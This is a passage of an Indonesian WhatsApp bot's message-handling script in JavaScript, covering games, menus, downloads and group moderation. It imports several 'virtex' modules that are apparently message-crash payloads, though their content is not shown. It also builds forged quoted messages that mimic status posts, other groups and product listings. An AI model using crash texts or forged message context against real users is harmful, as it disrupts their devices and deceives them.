////JANGAN DIBULLY YA OM:(
//// CMA KANG RECODE🥺
//// SC DISUSUN DARI FITUR IKY ADS , ZEEONE OFC ,ARIFIN RAZZAQ OFFICIAL
//// KALO NGEDIT YANG TELITI YA SAYANG
//// EROR? DOWNLOAD SC ULANG


const { 



  WAConnection: _WAConnection,



  MessageType,



  Presence,



  MessageOptions,



  Mimetype,



  WALocationMessage,



  WA_MESSAGE_STUB_TYPES,



  WA_DEFAULT_EPHEMERAL,



  ReconnectMode,



  ProxyAgent,



  ChatModification,



  GroupSettingChange,



  waChatKey,



  mentionedJid,



  processTime,



  Browsers,



} = require("@adiwajshing/baileys")



const Client = require('./lib/simple')





const WAConnection = Client.WAConnection(_WAConnection)

const moment = require("moment-timezone")



const speed = require('performance-now')



const { spawn, exec, execSync } = require("child_process")



const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require('brainly-scraper')
const fetch = require('node-fetch');



const ggs = require('google-it')



const request = require('request');



const crypto = require('crypto')



const yts = require( 'yt-search')



const ms = require('parse-ms')



const toMs = require('ms')



const axios = require("axios")



const fs = require("fs-extra")



const util = require('util')



const got = require("got");



const qrcodes = require('qrcode');



const imgbb = require('imgbb-uploader');



const os = require('os');



const tele = require('telegraph-uploader')



// stickwm



const Exif = require('./lib/exif');



const exif = new Exif();



const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp');







/** Voting **/



const { addVote, deleteVote } = require("./lib/vote");



/** add file file nya itu ya **/







const { downloadMenu, infoMenu, gameMenu, groupMenu, funMenu, wibuMenu, ownerMenu, stickerMenu, otherMenu, rulesBot } = require('./message/help.js')



const { getBuffer, getGroupAdmins, getRandom, runtime, sleep } = require('./lib/myfunc')



const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')



const { color, bgcolor } = require('./lib/color')



const { mess } = require('./message/mess')



const { Toxic } = require('./lib/Toxic.js')



const { cmdadd } = require('./lib/totalcmd.js')

const { virtex90 } = require('./virtex/virtex90')

const { virtex2 } = require('./virtex/virtex2')

const { virtex3 } = require('./virtex/virtex3')

const { virtex4 } = require('./virtex/virtex4')

const { virtex5 } = require('./virtex/virtex5')

const { virtex6 } = require('./virtex/virtex6')

const { virtex7 } = require('./virtex/virtex7')

const { virtex8 } = require('./virtex/virtex8')

const { virtex9 } = require('./virtex/virtex9')

const { ngazap } = require('./virtex/ngazap')

const { virtag } = require('./virtex/virtag')

const { emoji2 } = require('./virtex/emoji2')

const { simih } = require('./lib/functionss')

const { list_aov } = require('./shop/aov')

const { list_cod } = require('./shop/cod')

const { list_sausage } = require('./shop/sausage')

const { list_dmff } = require('./shop/ff')

const { list_lol } = require('./shop/lol')

const { list_valo } = require('./shop/valo')

const { list_price } = require('./shop/price')

const { allpayment } = require('./shop/allpayment')

const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')

const { allmenu } = require('./message/allmenu.js')

const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");



const { onGoing, dadu, asupan } = require("./lib/otakudesu.js")



const { mediafireDl } = require('./lib/mediafire.js')



const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")



const { y2mateA, y2mateV } = require('./lib/y2mate')



const { ythd } = require('./lib/ytdl')



const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword");



const premium = require("./lib/premium");



const afk = require("./lib/afk");



const level = require("./lib/level");



const atm = require("./lib/atm");



const _sewa = require("./lib/sewa");



/////////////////////////////////  cukup pake aja ya kak /////////////////////////////////////







var kuis = false



hit_today = []



ky_ttt = []



const setGelud = require('./lib/gameGelud.js')



const game = require("./lib/game");



tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]



const simple = require('./lib/simple.js')



let fakeimage = fs.readFileSync("./media/wpmobile.png")



let errorImg = 'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'



let setting = JSON.parse(fs.readFileSync('./setting.json'))



banChats = true;



owner = setting.owner



ownerNumber = setting.ownerNumber



gamewaktu = setting.gamewaktu



ppbot = setting.ppbot



qris = setting.qris



fakeyt = setting.fakeyt



fake = setting.fake







/** prefix option **/



let multipref = true;



let oneprefix = true;



let noprefix = false;



let preff = "!"



// Database







let antivo = JSON.parse(fs.readFileSync('./database/antiviewonce.json'));



let antidel = JSON.parse(fs.readFileSync("./database/antidelete.json"));



const antivirtex = JSON.parse(

      fs.readFileSync("./database/antivirtex.json")

    );



let badword = JSON.parse(fs.readFileSync('./database/badword.json'));



let grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));



let senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));



const samih = JSON.parse(fs.readFileSync('./src/simi.json'))



const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))



const setiker = JSON.parse(fs.readFileSync('./src/stik.json'))



const videonye = JSON.parse(fs.readFileSync('./src/video.json'))



const audionye = JSON.parse(fs.readFileSync('./src/audio.json'))



const imagenye = JSON.parse(fs.readFileSync('./src/image.json'))



//hit



global.hit = {}



let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))



let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))



let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))



let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));



let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));



let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))



let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))



let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))



let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));



let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
let antifirtex = JSON.parse(fs.readFileSync('./database/group/antifirtex.json'))
let antifirtex2 = JSON.parse(fs.readFileSync('./database/group/antifirtex2.json'))
let antifirtex3 = JSON.parse(fs.readFileSync('./database/group/antifirtex3.json'))
let antifirtex4 = JSON.parse(fs.readFileSync('./database/group/antifirtex4.json'))
let antifirtex5 = JSON.parse(fs.readFileSync('./database/group/antifirtex5.json'))
let antifirtex6 = JSON.parse(fs.readFileSync('./database/group/antifirtex6.json'))
let antifirtex7 = JSON.parse(fs.readFileSync('./database/group/antifirtex7.json'))

let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));



let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))



let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));



let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))



// GAME



let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))



let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))



let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))



let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))



let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))



let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))



let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))



let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))



let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))



let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))



let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))



let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))



let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))



let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))



let family100 = [];







// Sticker Cmd



const addCmd = (id, command) => {



  const obj = { id: id, chats: command }



  _scommand.push(obj)



  fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))



}







const getCommandPosition = (id) => {



  let position = null



  Object.keys(_scommand).forEach((i) => {



 if (_scommand[i].id === id) {



position = i



 }



  })



  if (position !== null) {



 return position



  }



}







const getCmd = (id) => {



  let position = null



  Object.keys(_scommand).forEach((i) => {



 if (_scommand[i].id === id) {



position = i



 }



  })



  if (position !== null) {



 return _scommand[position].chats



  }



  



}















const checkSCommand = (id) => {



  let status = false



  Object.keys(_scommand).forEach((i) => {



 if (_scommand[i].id === id) {



status = true



 }



  })



  return status



}



const getRespon = (txt) => {



  let position = null



  Object.keys(_respon).forEach((i) => {



 if (_respon[i].txt === txt) {



position = i



 }



  })



  if (position !== null) {



 return _respon[position].resp



  }



}







const getResponPosition = (txt) => {



  let position = null



  Object.keys(_respon).forEach((i) => {



 if (_respon[i].txt === txt) {



position = i



 }



  })



  if (position !== null) {



 return position



  }



}







const getAllRespon = () => {



  const array = []



  Object.keys(_respon).forEach((i) => {



 array.push(_respon[i].txt)



  })



  return array



}







module.exports = wann = async (wann, wan) => {



  try {



 if (!wan.hasNewMessage) return



wan = wan.messages.all()[0]



 if (!wan.message) return



if (wan.key && wan.key.remoteJid == 'status@broadcast') return



  if (wan.key.id.startsWith('3EB0') && wan.key.id.length === 12) return



 const { Functions }= require('./lib/functions.js');



  global.ky_ttt



  global.blocked



  wan.message = (Object.keys(wan.message)[0] === 'ephemeralMessage') ? wan.message.ephemeralMessage.message : wan.message







  const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType



  const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')



  const content = JSON.stringify(wan.message)



  const from = wan.key.remoteJid



  let isGroup = from.endsWith('@g.us')







  /** vote **/



  const isAntiviewonce = isGroup ? antivo.includes(from) : false;



  const isAntidel = isGroup ? antidel.includes(from) : false;







  const type = Object.keys(wan.message)[0]  



  const cmd = (type === 'conversation' && wan.message.conversation) ? wan.message.conversation : (type == 'imageMessage') && wan.message.imageMessage.caption ? wan.message.imageMessage.caption : (type == 'videoMessage') && wan.message.videoMessage.caption ? wan.message.videoMessage.caption : (type == 'extendedTextMessage') && wan.message.extendedTextMessage.text ? wan.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()



  // const prefix = /^[°Z•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•Zπ÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'



  



  if (multipref) {



 var prefix = /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢âœ“=|~!?@#%^&.zZ_•\/\\Â©^<+]/.test(cmd) ? cmd.match(/^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢âœ“=|~!?@#%^&.zZ_+•\/\\Â©^<+]/gi)[0]: '!'



  } else if (noprefix) {



 prefix = ""



  } else if (oneprefix) {



 prefix = preff



  }







  body = (type === 'conversation' && wan.message.conversation.startsWith(prefix)) ? wan.message.conversation : (type == 'imageMessage') && wan.message[type].caption.startsWith(prefix) ? wan.message[type].caption : (type == 'videoMessage') && wan.message[type].caption.startsWith(prefix) ? wan.message[type].caption : (type == 'extendedTextMessage') && wan.message[type].text.startsWith(prefix) ? wan.message[type].text : (type == 'listResponseMessage') && wan.message[type].singleSelectReply.selectedRowId ? wan.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && wan.message[type].selectedButtonId ? wan.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(wan.message[type].fileSha256.toString('base64')) !== null && getCmd(wan.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(wan.message[type].fileSha256.toString('base64')) : ""







  if (prefix != "") {



 if (!body.startsWith(prefix)) {



isCmdd = false



comm = ""



 } else {



isCmdd = true



comm = body.slice(1).trim().split(" ").shift().toLowerCase()



 }



  } else {



 isCmdd = false



 comm = body.trim().split(" ").shift().toLowerCase()



  }







  budy = (type === 'conversation') ? wan.message.conversation : (type === 'extendedTextMessage') ? wan.message.extendedTextMessage.text : ''



  const command = comm



  const args = body.trim().split(/ +/).slice(1)



  hit_today.push(command)



  const arg = body.substring(body.indexOf(' ') + 1)



  const ar = args.map((v) => v.toLowerCase())



  const argz = body.trim().split(/ +/).slice(1)



  const isCmd = isCmdd



  if (isCmd) cmdadd()



 const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd



  const q = args.join(' ')



  const Bfake = fs.readFileSync ('./media/image/fake.jpeg','base64')



  const botNumber = wann.user.jid



  const ownerNumber = setting.ownerNumber



  const ownerName = setting.ownerName



  const botName = setting.botName



  let sender = isGroup ? wan.participant : wan.key.remoteJid



  let senderr = wan.key.fromMe ? wann.user.jid : wan.key.remoteJid.endsWith('@g.us') ? wan.participant : wan.key.remoteJid



  const totalchat = await wann.chats.all()



  const groupMetadata = isGroup ? await wann.groupMetadata(from) : ''



  const groupName = isGroup ? groupMetadata.subject : ''



  const groupId = isGroup ? groupMetadata.jid : ''



  const groupMembers = isGroup ? groupMetadata.participants : ''



  const groupDesc = isGroup ? groupMetadata.desc : ''



  const groupOwner = isGroup ? groupMetadata.owner : ''



  const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''



  const isBotGroupAdmins = groupAdmins.includes(botNumber) || false



  const isGroupAdmins = groupAdmins.includes(sender) || false



  const conts = wan.key.fromMe ? wann.user.jid : wann.contacts[sender] || '-'



  const pushname = wan.key.fromMe ? wann.user.name : conts.notify || conts.vname || conts.name || '-'



  const mentionByTag = type == "extendedTextMessage" && wan.message.extendedTextMessage.contextInfo != null ? wan.message.extendedTextMessage.contextInfo.mentionedJid : []



  const mentionByreply = type == "extendedTextMessage" && wan.message.extendedTextMessage.contextInfo != null ? wan.message.extendedTextMessage.contextInfo.participant || "" : ""



  const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag



  mention != undefined ? mention.push(mentionByreply) : []



  const mentionUser = mention != undefined ? mention.filter(n => n) : []



  idttt = []



  players1 = []



  players2 = []



  gilir = []



  for (let t of ky_ttt){



 idttt.push(t.id)



 players1.push(t.player1)



 players2.push(t.player2)



 gilir.push(t.gilir)



  }



  const isTTT = isGroup ? idttt.includes(from) : false



  isPlayer1 = isGroup ? players1.includes(sender) : false



  isPlayer2 = isGroup ? players2.includes(sender) : false



  const isBadword = isGroup ? grupbadword.includes(from) : false



  const isOwner = ownerNumber.includes(senderr)



  const isRegister = register.includes(sender)



  const isPremium = premium.checkPremiumUser(sender, _premium)



  const isSewa = _sewa.checkSewaGroup(from, sewa)



  const isAfkOn = afk.checkAfkUser(sender, _afk)



  const isLevelingOn = isGroup ? _leveling.includes(from) : false



  const isMuted = isGroup ? mute.includes(from) : false



  const isAntiLink = isGroup ? antilink.includes(from) : false



  const isWelkom = isGroup ? welkom.includes(from) : false



  const isSimi = isGroup ? samih.includes(from) : false

   const isAntiFirtex = isGroup ? antifirtex.includes(from) : false
   const isAntiFirtex2 = isGroup ? antifirtex2.includes(from) : false
   const isAntiFirtex3 = isGroup ? antifirtex3.includes(from) : false
   const isAntiFirtex4 = isGroup ? antifirtex4.includes(from) : false
   const isAntiFirtex5 = isGroup ? antifirtex5.includes(from) : false
   const isAntiFirtex6 = isGroup ? antifirtex6.includes(from) : false
   const isAntiFirtex7 = isGroup ? antifirtex7.includes(from) : false
////=========================================================
  let d = new Date



  let locale = 'en'



  let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()



  let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]



  let week = d.toLocaleDateString(locale, { weekday: 'long' })



  let date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })



  let waktu = d.toLocaleDateString(locale, { hour: 'numeric', minute: 'numeric', second: 'numeric' })



////////// here button function///////////////////////////////



selectedButton = (type == 'buttonsResponseMessage') ? wan.message.buttonsResponseMessage.selectedButtonId : ''







responseButton = (type == 'listResponseMessage') ? wan.message.listResponseMessage.title : ''







const gcount = setting.gcount



const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan



  let po = wann.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "CLICK HERE","listType": "SINGLE_SELECT","sections": list}}, {})



  return wann.relayWAMessage(po, {waitForAck: true})



}



const isUrl = (url) => {



  return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))



}



function monospace(string) {



  return '```' + string + '```'



}



function jsonformat(string) {



  return JSON.stringify(string, null, 2)



}



function randomNomor(angka){



  return Math.floor(Math.random() * angka) + 1



}



function clockString(ms) {







      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);







      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;







      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;







      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");







    }           







		    let settingstatus = 0;







    if (new Date() * 1 - settingstatus > 1000) {







      let _uptime = process.uptime() * 1000;







      let uptimer = clockString(_uptime);







      await wann.setStatus(`I'm ${botName} | Runtime ${runtime(process.uptime())}⏰ | My Owner ${ownerName}`).catch((_) => _);







      settingstatus = new Date() * 1;







    }











const reply = (teks) => {



  var ids = teks.includes('@') ? teks.split('@'): []



  let semdertag = []



  for (var con of ids) {



 semdertag.push(con.split(' ')[0]+'@s.whatsapp.net')



  }



  wann.sendMessage(from, teks, MessageType.text, {



 quoted: wan, thumbnail: fakeimage, contextInfo: {



mentionedJid: semdertag }});



}











const sendMess = (hehe, teks) => {



  wann.sendMessage(hehe, teks, text)



}



const mentions = (teks, memberr, id) => {



  (id == null || id == undefined || id == false) ? wann.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.png')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : wann.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.png')}, extendedText, { sendEphemeral: true, quoted: freply, contextInfo: { "mentionedJid": memberr } })



}



const sendText = (from, text) => {



  wann.sendMessage(from, text, MessageType.text)



}

const textImg = (teks) => {



  return wann.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./media/wpmobile.png')})



}



const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('././Invi.jpg')



}}}



const math = (teks) => {



  return Math.floor(teks)



}



const fakestatus = (teks) => {



          wann.sendMessage(from, teks, text, {



                quoted: {



                    key: {



                        fromMe: false,



                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})



                    },



                    message: {



                        "imageMessage": {



                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",



                            "mimetype": "image/jpeg",



                            "caption": fake,



                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",



                            "fileLength": "28777",



                            "height": 1080,



                            "width": 1079,



                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",



                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",



                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",



                            "mediaKeyTimestamp": "1610993486",



                            "jpegThumbnail": fs.readFileSync(`image/odc.jpeg`),



                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="



                        }



                    }



                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true



            })



        }

        const fakegroup = (teks) => {

            wann.sendMessage(from, teks, text, {

                quoted: {

                    key: {

                        fromMe: false,

                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})

                    },

                    message: {

                        "imageMessage": {

                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",

                            "mimetype": "image/jpeg",

                            "caption": fake,

                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",

                            "fileLength": "28777",

                            "height": 1080,

                            "width": 1079,

                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",

                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",

                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",

                            "mediaKeyTimestamp": "1610993486",

                            "jpegThumbnail": fs.readFileSync(`./image/odc.jpeg`),

                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="

                        }

                    }

                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true

            })

        }

        const ftoko = {

key: {

			fromMe: false,

			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})

		},

		message: {

			"productMessage": {

				"product": {

					"productImage":{

						"mimetype": "image/jpeg",

						"jpegThumbnail": fs.readFileSync(`image/odc.jpeg`) //Gambarnye

					},

					"title": 'WANN BOTZ', 

					"description": "WANN BOT", 

					"currencyCode": "IDR",

					"priceAmount1000": "70000000",

					"retailerId": 'Whatsapp bot',

					"productImageCount": 1

				},

				    "businessOwnerJid": `0@s.whatsapp.net`

		}

	}

}
 
const kick = function(from, orangnya){



  for (let i of orangnya){



 wann.groupRemove(from, [i])



  }



}



const kickMember = async(id, target = []) => {



  let group = await wann.groupMetadata(id)



  let owner = group.owner.replace("c.us", "s.whatsapp.net")



  let me = wann.user.jid



  for (i of target) {



 if (!i.includes(me) && !i.includes(owner)) {



await wann.groupRemove(to, [i])



 } else {



await wann.sendMessage(id, "Not Premited!", "conversation")



break



 }



  }



}



const add = function(from, orangnya){



  wann.groupAdd(from, orangnya)



}



const sendKontak = (from, nomor, nama, org = "") => {



  const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'



  wann.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: freply})



}



const hideTag = async function(from, text){



  let anu = await wann.groupMetadata(from)



  let members = anu.participants



  let ane = []



  for (let i of members){



 ane.push(i.jid)



  }



  wann.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('./Invi.jpg')},



 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})



}  



const sendWebp = async(to, url) => {



  var names = Date.now() / 10000;



  var download = function (uri, filename, callback) {



 request.head(uri, function (err, res, body) {



request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);



 });



  };



  download(url, './sticker' + names + '.png', async function () {



 console.log('selesai');



 let filess = './sticker' + names + '.png'



 let asw = './sticker' + names + '.webp'



 exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {



fs.unlinkSync(filess)



if (err) return reply(`${err}`)



  exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {



 if (error) return reply(`${error}`)



wann.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:wan})



 fs.unlinkSync(asw)



  });



 });



  });



}





const getRegisteredRandomId = () => {



  return _registered[Math.floor(Math.random() * _registered.length)].id



}



const addRegisteredUser = (userid, sender, age, time, serials) => {



  const obj = { id: userid, name: sender, age: age, time: time, serial: serials }



  _registered.push(obj)



  fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))



}



const checkRegisteredUser = (sender) => {



  let status = false



  Object.keys(_registered).forEach((i) => {



 if (_registered[i].id === sender) {



status = true



 }



  })



  return status



}



//////////////////////////////////////////////////////////////////////////////////////////////



/////////////////////////////////////////////////////////////////////////////////////////////



//<ini const button>//



const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {



  kma = vid1



  mhan = await wann.prepareMessage(from, kma, video)



  const buttonMessages = {



 videoMessage: mhan.message.videoMessage,



 contentText: text1,



 footerText: desc1,



 buttons: but,



 headerType: 5



  }



  wann.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)



}



///Button Location



const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {



  kma = gam1



  mhan = await wann.prepareMessage(from, kma, location)



  const buttonMessages = {



 locationMessage: mhan.message.locationMessage,



 contentText: text1,



 footerText: desc1,



 buttons: but,



 headerType: 6



  }



  wann.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)



}



const isRegistered = checkRegisteredUser(sender)



/////< ini Button Text>///////



const sendButMessage = (id, text1, desc1, but = [], options = {}) => {



  const buttonMessage = {



 contentText: text1,



 footerText: desc1,



 buttons: but,



 headerType: 1,



  };



  wann.sendMessage(



 id,



 buttonMessage,



 MessageType.buttonsMessage,



 options



 );



};



///////////// lanjut mass /////////////



const sendMediaURL = async(to, url, text="", mids=[]) =>{



  if(mids.length > 0){



 text = normalizeMention(to, text, mids)



  }



  const fn = Date.now() / 10000;



  const filename = fn.toString()



  let mime = ""



  var download = function (uri, filename, callback) {



 request.head(uri, function (err, res, body) {



mime = res.headers['content-type']



request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);



 });



  };



  download(url, filename, async function () {



 console.log('done');



 let media = fs.readFileSync(filename)



 let type = mime.split("/")[0]+"Message"



 if(mime === "image/gif"){



type = MessageType.video



mime = Mimetype.gif



 }



 if(mime.split("/")[0] === "audio"){



mime = Mimetype.mp4Audio



 }



 wann.sendMessage(to, media, type, {quoted: freply, mimetype: mime, caption: text, thumbnail:fakeimage, contextInfo: {"mentionedJid": mids}})



 fs.unlinkSync(filename)



  });



}



const sendFileFromUrl = async(link, type, options) => {



  hasil = await getBuffer(link)



  wann.sendMessage(from, hasil, type, options).catch(e => {



 fetch(link).then((hasil) => {



wann.sendMessage(from, hasil, type, options).catch(e => {



  wann.sendMessage(from, { url : link }, type, options).catch(e => {



 reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')



 console.log(e)



  })



})



 })



  })



}



const promoteAdmin = async function(to, target=[]){



  if(!target.length > 0) { return  reply("No target..") }



 let g = await wann.groupMetadata(to)



  let owner = g.owner.replace("c.us","s.whatsapp.net")



  let me = wann.user.jid



  for (i of target){



 if (!i.includes(me) && !i.includes(owner)){



const res = await wann.groupMakeAdmin(to, [i])



 }else{



reply("NOT PREMITED")



 }



  }



  var hayuk0 = '[NOT VERIFIED]'



  if (isRegistered) {



 hayuk0 = '[√ VERIFIED]'



  }



}



const limitAdd = (sender) => {



  let position = false



  Object.keys(_limit).forEach((i) => {



 if (_limit[i].id == sender) {



position = i



 }



  }) 



  if (position !== false) {



 _limit[position].limit += 1



 fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))



  }



}



const demoteAdmin = async function(to, target=[]){



  if(!target.length > 0) { return  reply("No target..") }



 let g = await wann.groupMetadata(to)



  let owner = g.owner.replace("c.us","s.whatsapp.net")



  let me = wann.user.jid



  for (i of target){



 if (!i.includes(me) && !i.includes(owner)){



const res = await wann.groupDemoteAdmin(to, [i])



 }else{



reply("NOT PREMITED")



 }



  }



}



let authorname = wann.contacts[from] != undefined ? wann.contacts[from].vname || wann.contacts[from].notify : undefined	



if (authorname != undefined) { } else { authorname = groupName }	



  function addMetadata(packname, author) {	



 if (!packname) packname = 'WABot'; if (!author) author = 'Bot';author = author.replace(/[^a-zA-Z0-9]/g, '');	



 let name = `${author}_${packname}`



 if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`



const json = {	



  "sticker-pack-name": packname,



  "sticker-pack-publisher": author,



}



const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	



const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	



let len = JSON.stringify(json).length	



let last	



if (len > 256) {	



  len = len - 256	



  bytes.unshift(0x01)	



} else {	



  bytes.unshift(0x00)	



}	



if (len < 16) {	



  last = len.toString(16)	



  last = "0" + len	



} else {	



  last = len.toString(16)	



}	



const buf2 = Buffer.from(last, "hex")	



const buf3 = Buffer.from(bytes)	



const buf4 = Buffer.from(JSON.stringify(json))	



const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])



fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	



  return `./sticker/${name}.exif`	



})	



 }



 const isImage = (type === 'imageMessage')



 const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')



 if(time2 < "23:59:00"){



var ucapanWaktu = 'Good night🌌'



 }



 if(time2 < "19:00:00"){



var ucapanWaktu = 'Good afternoon'



 }



 if(time2 < "18:00:00"){



var ucapanWaktu = 'Good afternoon'



 }



 if(time2 < "15:00:00"){



var ucapanWaktu = 'Good afternoon'



